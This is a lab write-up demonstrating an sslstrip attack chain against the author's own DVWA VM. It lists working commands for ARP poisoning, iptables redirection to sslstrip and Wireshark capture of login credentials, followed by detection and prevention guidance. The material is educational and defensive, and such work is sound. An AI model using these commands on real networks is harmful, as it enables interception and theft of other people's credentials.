# Practical 1 — Sniffing Passwords in a LAN (sslstrip)

> Lab writeup. Performed against my own DVWA VM on an isolated host-only
> network. See [`../README.md`](../README.md) for lab setup and scope.

---

## 1. Objective

Demonstrate the classic SSL-stripping attack chain:

1. Redirect a victim's traffic through the attacker (ARP cache poisoning).
2. Downgrade HTTPS links to HTTP where possible (sslstrip).
3. Capture POSTed form credentials with Wireshark.

And — equally important — record **why this attack has decayed since ~2015**
and what stops it today.

---

## 2. Background

### ARP cache poisoning
ARP has no authentication. Any host on the broadcast domain can claim any
IP. Telling the victim "I am the gateway" and the gateway "I am the victim"
puts the attacker on the wire between them.

### IP forwarding
Without forwarding, the attacker silently blackholes the victim's traffic and
the victim notices instantly. Forwarding makes the attacker a transparent
relay so the attack stays invisible.

### sslstrip
Published by Moxie Marlinspike (Black Hat DC 2009). Exploits the fact that
users reach HTTPS sites by clicking HTTP links or typing bare domains.
sslstrip rewrites `https://` URLs to `http://` in proxied pages, keeps an
HTTPS session with the real server, and reads cleartext from the victim side.

### Why it mostly doesn't work in 2026
- **HSTS** (RFC 6797) — browsers refuse HTTP for known hosts.
- **HSTS preload lists** shipped with browsers — no first-visit window.
- **HTTPS-Only / HTTPS-First** browser modes.
- `Upgrade-Insecure-Requests` and `Secure` cookies.

The lab uses DVWA on plain HTTP because that's the only condition where the
chain still completes end-to-end. In the real world the conditions rarely
line up anymore — which is the point of running the lab.

---

## 3. Lab Procedure

All commands on the **attacker VM**, targeting the **victim VM I own**.

```bash
# Enable forwarding so we relay rather than blackhole
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Redirect inbound HTTP to sslstrip's listener
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 \
              -j REDIRECT --to-port 10000

# Start sslstrip
sslstrip -a -l 10000 -w /tmp/sslstrip.log &

# ARP poison (two terminals)
sudo arpspoof -i eth1 -t 192.168.56.20 192.168.56.1   # tell victim we are GW
sudo arpspoof -i eth1 -t 192.168.56.1 192.168.56.20   # tell GW we are victim

# Capture
sudo wireshark &     # filter: http.request.method == POST
```

On the victim VM I browse to the lab DVWA login page (plain HTTP) and submit
the default `admin` / `password`. Wireshark on the attacker shows the POST;
right-click → Follow → TCP Stream reveals the form body.

### Cleanup
```bash
sudo pkill sslstrip
sudo iptables -t nat -F
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```
Then restore VM snapshots.

---

## 4. Detection

| Signal | Where to look |
|---|---|
| Two IPs mapped to the same MAC | `arp -a` on the victim |
| Burst of gratuitous ARP replies | `arpwatch`, Wireshark filter `arp.duplicate-address-detected` |
| One MAC claiming many IPs | Suricata / Snort ARP rules |
| Downgraded URL / missing padlock | The user (security awareness) |

---

## 5. Prevention

- **Dynamic ARP Inspection (DAI)** + DHCP snooping on access switches.
- **Static ARP** for high-value hosts where feasible.
- **802.1X** to gate L2 access.
- **HSTS + preload** on every web property; HTTPS-only redirects.
- **VPN** on untrusted networks.
- **Smaller VLANs** — limits the blast radius of any L2 attack.

---

## 6. Modern Relevance

The ARP-spoofing half is still very much alive on flat networks without DAI.
The SSL-stripping half has been largely defanged for any site that has been
visited over HTTPS once or is on the HSTS preload list. CEH still teaches the
chain because the L2 trust assumption it exploits is foundational, and the
detection / prevention vocabulary it introduces (DAI, DHCP snooping, HSTS) is
core blue-team material.

---

## 7. References

- Marlinspike, M. *New Tricks for Defeating SSL in Practice.* Black Hat DC 2009.
- RFC 6797 — HTTP Strict Transport Security.
- Cisco — Configuring Dynamic ARP Inspection.
- OWASP — Man-in-the-Middle Attack.
- DVWA — https://github.com/digininja/DVWA
